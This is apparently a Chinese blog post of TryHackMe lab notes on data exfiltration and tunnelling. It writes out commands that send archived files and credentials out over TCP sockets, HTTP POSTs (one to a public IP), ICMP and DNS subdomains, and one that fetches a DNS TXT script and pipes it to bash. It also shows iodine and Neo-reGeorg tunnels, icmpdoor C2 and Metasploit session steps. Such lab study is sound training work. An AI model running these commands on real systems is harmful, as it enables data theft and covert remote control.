主要用例场景</span><br><span class="line"></span><br><span class="line">1. 传统数据泄露</span><br><span class="line">   - 服务器自己往外传的</span><br><span class="line">     - 发送和接收流量会朝一个方向进行？</span><br><span class="line">2. c2通信</span><br><span class="line">3. 隧道</span><br><span class="line">   - 建立连接时将有连续的流量发送和接收。</span><br><span class="line"></span><br><span class="line">### tcp套接字进行渗透</span><br><span class="line"></span><br><span class="line">，前一个开监听，一个一个往外传</span><br><span class="line"></span><br><span class="line">- 监听</span><br><span class="line">  - nc -lvp 8080 &gt; /tmp/task4-creds.data</span><br><span class="line">- 传</span><br><span class="line">  - tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.0.133/8080</span><br><span class="line">    - 我们使用 tar命令并使用秘密目录内容的zcf 参数创建一个存档文件 。 </span><br><span class="line">    - z 表示 使用gzip压缩选定的文件夹， c 表示创建新的存档， f表示使用存档文件。 </span><br><span class="line">    - 然后，我们将创建的 tar 文件传递给 base64 命令，将其转换为 base64 表示形式。</span><br><span class="line">    - 然后，我们传递 base64 命令的结果，使用 EBCDIC 编码数据通过 dd 命令创建并复制备份文件。</span><br><span class="line">    - 最后，我们重定向 dd命令的输出，使用指定 IP 和端口（在本例中为端口8080） 上的 TCP 套接字进行传输 。</span><br><span class="line">- 收到编码转换+解压</span><br><span class="line">  - dd conv=ascii if=task4-creds.data |base64 -d &gt; task4-creds.tar</span><br><span class="line">  - tar xvf task4-creds.tar</span><br><span class="line">- 直接看</span><br><span class="line">  - cat task4/creds.txt</span><br><span class="line"></span><br><span class="line">### ssh进行渗透</span><br><span class="line"></span><br><span class="line">跟上面差不多，再多个ssh连接顺便把文件带上</span><br><span class="line"></span><br><span class="line">- tar cf - task5/ | ssh thm@jump.thm.com &quot;cd /tmp/; tar xpf -&quot;</span><br><span class="line"></span><br><span class="line">### HTTP(S)进行渗透</span><br><span class="line"></span><br><span class="line">apache2日志文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
</li>
</ol>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### HTTP隧道1</span><br><span class="line"></span><br><span class="line">- web监听码</span><br><span class="line"></span><br><span class="line">  - ```php</span><br><span class="line">    &lt;?php </span><br><span class="line">    if (isset($_POST[&#x27;file&#x27;])) &#123;</span><br><span class="line">            $file = fopen(&quot;/tmp/http.bs64&quot;,&quot;w&quot;);</span><br><span class="line">            fwrite($file, $_POST[&#x27;file&#x27;]);</span><br><span class="line">            fclose($file);</span><br><span class="line">       &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>传文件</p>
<ul>
<li><p>curl –data “file&#x3D;$(tar zcf - task6 | base64)” <a target="_blank" rel="noopener" href="http://web.thm.com/contact.php">http://web.thm.com/contact.php</a></p>
</li>
<li><pre><code>tar zcf - app | base64 &gt; tmp.txt
curl --data &quot;file=$(cat tmp.txt)&quot; http://123.56.226.71/1.php
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - curl --data-binary @tmp.txt http://123.56.226.71/1.php</span><br><span class="line"></span><br><span class="line">- 修复文件</span><br><span class="line"></span><br><span class="line">  - sudo sed -i &#x27;s/ /+/g&#x27; /tmp/http.bs64</span><br><span class="line"></span><br><span class="line">- 解密文件</span><br><span class="line"></span><br><span class="line">  - cat /tmp/http.bs64 | base64 -d | tar xvfz -</span><br><span class="line"></span><br><span class="line">#### HTTP隧道2</span><br><span class="line"></span><br><span class="line">利用工具，往web服务上传码</span><br><span class="line"></span><br><span class="line">利用工具进行连接**Neo-reGeorg**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
<p>root@AttackBox:&#x2F;opt&#x2F;Neo-reGeorg# python3 neoreg.py generate -k thm<br>#生成码</p>
<p>#连接<br>python3 neoreg.py -k thm -u <a target="_blank" rel="noopener" href="http://10.10.193.228/uploader/files/tunnel.php">http://10.10.193.228/uploader/files/tunnel.php</a></p>
<p>#使用与测试<br>curl –socks5 127.0.0.1:1080 <a target="_blank" rel="noopener" href="http://172.20.0.121/">http://172.20.0.121:80</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### ICMP渗透</span><br><span class="line"></span><br><span class="line">假设我们需要窃取以下凭证 thm:tryhackme 。首先，我们需要将其转换为十六进制表示，然后 使用 -p选项将其传递给ping命令，如下所示，</span><br><span class="line"></span><br><span class="line">使用 -p 参数，我们可以指定要通过数据包发送的 16 字节十六进制数据。 请注意， -p选项仅适用于Linux操作系统。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>echo “thm:tryhackme” | xxd -p<br>#信息转为16进制<br>ping 10.10.193.228 -c 1 -p 74686d3a7472796861636b6d650a<br>#发送16进制</p>
<p>ping 10.10.193.228 -c 1<br>#-c 1是发送一个包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 使用msf攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>use auxiliary&#x2F;server&#x2F;icmp_exfil<br>set BPF_FILTER icmp and not src ATTACKBOX_IP<br>set INTERFACE eth0<br>run</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">受害机执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo nping –icmp -c 1 ATTACKBOX_IP –data-string “BOFfile.txt”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这样传输文件，传输语句也行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo nping –icmp -c 1 ATTACKBOX_IP –data-string “admin:123456”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 使用icmpdoor攻击</span><br><span class="line"></span><br><span class="line">受害机</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo icmpdoor -i eth0 -d 192.168.0.133</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">攻击机器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo icmp-cnc -i eth1 -d 192.168.0.121</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后就可以在攻击机器上进行命令执行</span><br><span class="line"></span><br><span class="line">## DNS数据泄露</span><br><span class="line"></span><br><span class="line">### 原理</span><br><span class="line"></span><br><span class="line">假设我们有一个包含敏感数据（例如信用卡信息）的creds.txt 文件。要通过 DNS 协议移动它，我们需要对文件内容进行编码并将其附加为子域名 ，如下所示，</span><br><span class="line"></span><br><span class="line">![image-20250112161508254](https://github.com/DDL08/images/blob/img/img/image-20250112161508254.png?raw=true)</span><br><span class="line"></span><br><span class="line">1. 获取需要传输的所需数据。</span><br><span class="line">2. 使用其中一种编码技术对文件进行编码。</span><br><span class="line">3. 将编码字符作为子域/标签发送。</span><br><span class="line">4. 考虑 DNS 协议的限制。请注意，我们可以向域名添加尽可能多的数据，但必须将整个 URL 保持在 255 个字符以下，并且每个子域标签不能超过 63 个字符。如果超出这些限制，我们会拆分数据并发送更多DNS请求！</span><br><span class="line"></span><br><span class="line">### DNS手动通信</span><br><span class="line"></span><br><span class="line">通过dig命令手动发送编码数据</span><br><span class="line"></span><br><span class="line">将 base64 数据作为子域名发送，同时考虑DNS限制👇</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cat task9&#x2F;credit.txt |base64 | tr -d “\n” | fold -w18 | sed ‘s&#x2F;.*&#x2F;&amp;.&#x2F;‘ | tr -d “\n” | sed s&#x2F;$&#x2F;att.tunnel.com&#x2F; | awk ‘{print “dig +short “ $1}’ | bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接收</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo tcpdump -i eth0 udp port 53 -v</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### DNS脚本通信</span><br><span class="line"></span><br><span class="line">访问查看脚本内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dig +short -t TXT script.tunnel.com</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">执行脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dig +short -t TXT script.tunnel.com | tr -d “&quot;“ | base64 -d | bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## DNS隧道</span><br><span class="line"></span><br><span class="line">**利用工具iodine**</span><br><span class="line"></span><br><span class="line">攻击机打开服务</span><br><span class="line">sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com</span><br><span class="line"></span><br><span class="line">- 确保使用 sudo 执行该命令。iodined 会创建一个新的网络接口 (dns0)，用于通过DNS进行隧道传输。</span><br><span class="line">- -f 参数是在前台运行服务器。</span><br><span class="line">- -c 参数用于跳过检查每个DNS请求的客户端 IP 地址和端口。</span><br><span class="line">- -P 参数用于设置身份验证的密码。</span><br><span class="line">- 10.1.1.1/24 参数用于设置新网络接口 (dns0) 的网络 IP。服务器的 IP 地址为 10.1.1.1，客户端的 IP 地址为 10.1.1.2。</span><br><span class="line">- att.tunnel.com 是我们之前设置的名称服务器。</span><br><span class="line"></span><br><span class="line">然后新开个框等②</span><br><span class="line"></span><br><span class="line">受害机连接</span><br><span class="line">sudo iodine -P thmpass att.tunnel.com</span><br><span class="line"></span><br><span class="line">②通过网络 10.1.1.1/24 进行的所有通信都将通过DNS进行。我们将使用动态端口转发功能的 -D 参数来使用SSH会话作为代理。请注意，我们使用了 -f 参数来强制 ssh 进入后台。 -4 参数强制 ssh 客户端仅绑定在 IPv4 上。</span><br><span class="line"></span><br><span class="line">操作👇</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ssh <a href="mailto:&#116;&#x68;&#109;&#x40;&#49;&#x30;&#46;&#x31;&#x2e;&#49;&#x2e;&#50;">&#116;&#x68;&#109;&#x40;&#49;&#x30;&#46;&#x31;&#x2e;&#49;&#x2e;&#50;</a> -4 -f -N -D 1080<br>root@attacker$ proxychains curl <a target="_blank" rel="noopener" href="http://192.168.0.100/demo.php">http://192.168.0.100/demo.php</a><br>下边俩操作二选一<br>root@attacker$ #OR<br>root@attacker$ curl –socks5 127.0.0.1:1080 <a target="_blank" rel="noopener" href="http://192.168.0.100/demo.php">http://192.168.0.100/demo.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 主机规避</span><br><span class="line"></span><br><span class="line">## window内部原理</span><br><span class="line"></span><br><span class="line">启动进程默认应用示例</span><br><span class="line"></span><br><span class="line">MsMpEng（微软Defender）</span><br><span class="line">wininit（键盘和鼠标）</span><br><span class="line">lsass（凭证存储）</span><br><span class="line"></span><br><span class="line">攻击者可以使用的攻击媒介</span><br><span class="line"></span><br><span class="line">进程注入（T1055）</span><br><span class="line">工艺镂空 ( T1055.012 )</span><br><span class="line">进程伪装（T1055.013）</span><br><span class="line"></span><br><span class="line">**DLL**（全称：**Dynamic Link Library**）是动态链接库的缩写，是 Windows 操作系统中一种包含可执行代码和数据的文件格式。</span><br><span class="line"></span><br><span class="line">**PE**（**Portable Executable**）是 Windows 操作系统中使用的可执行文件格式。</span><br><span class="line"></span><br><span class="line">## windowsAPI</span><br><span class="line"></span><br><span class="line">研究网址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows.h">https://en.wikipedia.org/wiki/Windows.h</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| **用户模式**         | **内核模式**     |</span><br><span class="line">| -------------------- | ---------------- |</span><br><span class="line">| 没有直接硬件访问     | 直接硬件访问     |</span><br><span class="line">| 访问“拥有的”内存位置 | 访问整个物理内存 |</span><br><span class="line"></span><br><span class="line">| **Character** | **Explanation**                                              |</span><br><span class="line">| ------------- | ------------------------------------------------------------ |</span><br><span class="line">| A             | Represents an 8-bit character set with ANSI encoding         |</span><br><span class="line">| W             | Represents a Unicode encoding                                |</span><br><span class="line">| Ex            | Provides extended functionality or in/out parameters to the API call |</span><br><span class="line"></span><br><span class="line">Windows 头文件（也称为 Windows 加载器）</span><br><span class="line"></span><br><span class="line">### 操作系统库</span><br><span class="line"></span><br><span class="line">- windows头文件</span><br><span class="line"></span><br><span class="line">- p/调用</span><br><span class="line"></span><br><span class="line">  - ASLR内存保护解决方案可以掩盖导入 API 调用的过程</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">## 题</span><br><span class="line"></span><br><span class="line">#### smb登录</span><br><span class="line"></span><br><span class="line">您可以使用以下凭据模拟对SMB（服务器消息块）的初始攻击（使用 exploit/windows/smb/psexec）</span><br><span class="line"></span><br><span class="line">用户名： ballen</span><br><span class="line"></span><br><span class="line">密码：Password1</span><br><span class="line"></span><br><span class="line">#### 域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>post&#x2F;windows&#x2F;gather&#x2F;enum_domain</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 共享文件名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>post&#x2F;windows&#x2F;gather&#x2F;enum_shares</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 查找文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>search -f *.txt<br>search -f secrets.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### shell转meterpreter</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sessions -u 3<br>sessions -u -1<br>#开metepreter</p>
<p>ctrl+z   然后y转为后台<br>use post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter<br>拿模块打<br>set session<br>然后等着出新session</p>
<pre><code>
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/17/THM%E7%AC%94%E8%AE%B0/">http://example.com/2025/03/17/THM%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/03/THM-Ra2/" title="THM-Ra2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">THM-Ra2</div></div><div class="info-2"><div class="info-item-1">本关讲的是个DNS投毒+SeImpersonatePrivilege提权 nmap -v –min-rate 10000 10.10.113.180 -p-  nmap -T4 -n -sC -sV -Pn  10.10.113.180 -p 53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49667,49668,49669,49670,49671,49687,49699 firefox报错了，👇扫扫目录 1./gobuster dir -k -u https://fire.windcorp.thm  -q -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    PFX 文件用工具暴力破解密码然后连接 123456crackpkcs12 -d...</div></div></div></a><a class="pagination-related" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2024鹏程杯</div></div><div class="info-2"><div class="info-item-1">鹏程杯python口算1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport re# 发送 GET 请求获取算式def get_calculation_problem(url):    response = requests.get(url)    if response.status_code == 200:        return response.text    else:        print(&quot;Failed to retrieve the calculation problem&quot;)        return None# 解析算式并计算答案def calculate_answer(problem):    # 使用正则表达式提取算式    #calculation = re.search(r&#x27;&lt;h1&gt;(.+?)&lt;/h1&gt;&#x27;,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/" title="第二届长城杯&#x2F;铁三"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届长城杯&#x2F;铁三</div></div><div class="info-2"><div class="info-item-1">第二届国赛webSafe_Proxy源码题目 1from flask import Flask, request, render_template_stringimport socketimport threadingimport htmlapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=&quot;GET&quot;])def source():    with open(__file__, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        return&#x27;&lt;pre&gt;&#x27;+html.escape(f.read())+&#x27;&lt;/pre&gt;&#x27;@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])def template():    template_code = request.form.get(&quot;code&quot;)    # 安全过滤   ...</div></div></div></a><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-17</div><div class="info-item-2">2024鹏程杯</div></div><div class="info-2"><div class="info-item-1">鹏程杯python口算1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport re# 发送 GET 请求获取算式def get_calculation_problem(url):    response = requests.get(url)    if response.status_code == 200:        return response.text    else:        print(&quot;Failed to retrieve the calculation problem&quot;)        return None# 解析算式并计算答案def calculate_answer(problem):    # 使用正则表达式提取算式    #calculation = re.search(r&#x27;&lt;h1&gt;(.+?)&lt;/h1&gt;&#x27;,...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2025元旦渗透赛复现-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  拿python运行一下没出来一堆数据 去找库👇 pip show secretMessageResponse  crypto环境问题from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THM%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">THM笔记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 